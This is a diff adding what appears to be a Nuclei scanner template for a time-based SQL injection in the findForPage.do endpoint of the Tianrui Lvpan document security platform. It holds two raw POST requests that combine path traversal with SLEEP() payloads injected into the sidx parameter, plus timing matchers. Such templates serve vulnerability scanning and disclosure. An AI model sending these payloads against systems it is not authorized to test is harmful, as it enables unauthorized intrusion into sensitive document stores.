@@ -1,0 +1,28 @@
+id: tianrui-findForPage_do-sql-time
+
+info:
+  name: 天锐绿盘文档安全管理平台 findForPage.do SQL注入漏洞
+  author: tianrui
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../admin/bfclConfig/findForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(5)))x)
+      - |
+        POST /lddsm/service/../admin/bfclConfig/findForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(9)))x)
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=6'  
+          - 'duration_2>=8 && duration_2<=10'
+        condition: and
